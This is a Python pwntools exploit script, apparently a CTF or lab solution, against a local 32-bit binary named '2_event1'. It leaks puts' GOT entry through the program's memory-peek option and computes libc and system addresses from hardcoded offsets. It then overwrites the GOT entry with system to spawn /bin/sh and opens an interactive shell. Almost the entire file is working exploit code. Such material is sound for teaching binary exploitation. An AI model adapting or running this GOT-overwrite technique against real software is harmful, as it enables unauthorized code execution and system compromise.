#!/usr/bin/python

from pwn import *
from os import *

def main():

	# Variable declaration
	puts_gots = 0x0804a020 
	puts_offset  = 0x5fca0 
	system_offset = 0x3ada0
	sh_str = "/bin/sh"

	# Starts proccess 
	p = process("./2_event1")
	
	# Prints PID
        #raw_input(str(p.proc.pid))


	## SEND ARGUMENT TO SYSTEM SECTION
	# Skips till name entry prompt
	p.recvrepeat(0.2)
	p.sendline(sh_str) # Sends /bin/sh as name

	
	'''
	# GOT puts
	readelf -r ./2_event1 |grep puts
	--> 0804a020  00000607 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0

	# offset puts	
	objdump -d /lib/i386-linux-gnu/libc-2.23.so | grep "<_IO_puts@@GLIBC_2.0>"
	--> 0005fca0 <_IO_puts@@GLIBC_2.0>:

	# offset system
	objdump -d /lib/i386-linux-gnu/libc-2.23.so | grep "<__libc_system@@GLIBC_PRIVATE>"
	--> 0003ada0 <__libc_system@@GLIBC_PRIVATE>:	
	'''

	## LEAK SECTIONN
	# Skips OPTION prompt
	p.recvrepeat(0.2) 
	p.sendline("1") # Select option {1} to peek memory address

	# Sends the GOT puts address to leak the real address of puts
	p.sendline(hex(puts_gots))
	data = p.recvline()


	'''
	# Example string { 
	Address: 0x0804a020
	Contents: 0xdeadbeef
	'''

	puts_addr = ""
	for i in data.split("\n"):
		if "Address: Contents:" in i:
			puts_addr = i[ i.find("0x") : len(i) ] # Only finds the hex address in STRING format	
			puts_addr = int(puts_addr, 16) # Converts the HEX STRING to integer(BASE 16)

	log.info("puts address [ 0x%x ]" %puts_addr)


	## CALCULATE ADDRESS SECTION
	# Calculate libc base address
	libc_base_addr = puts_addr - puts_offset 
	log.info("libc base address [ 0x%x ]" %libc_base_addr)
	
	# Calculate system address
	system_addr = libc_base_addr + system_offset 
	log.info("system address [ 0x%x ]" %system_addr)


	## OVERWRITING SECTION
	# Skips OPTION prompt
	p.recvrepeat(0.2)
	p.sendline("3") # Select option {3} to ovewrite memory address

	# Skips ADDRESS prompt
	p.recvrepeat(0.2)
	p.sendline(hex(puts_gots))				
	log.info("puts GOT address sent [ 0x%x ]" %puts_gots)

	# Skips VALUE prompt
	p.recvrepeat(0.2)
	p.sendline(hex(system_addr)) # send system address to ovewrite puts GOT address
	log.info("puts GOT address { OVERWRITTEN } -> 0x%x <-" %system_addr)

	# Skips OPTION prompt
	p.recvrepeat(0.2)

	
	## SEND BACK SHELL SECTION
	# Pass control of program to user
	p.sendline("id; uname -a")
	p.interactive()


if __name__ == "__main__":
	main()
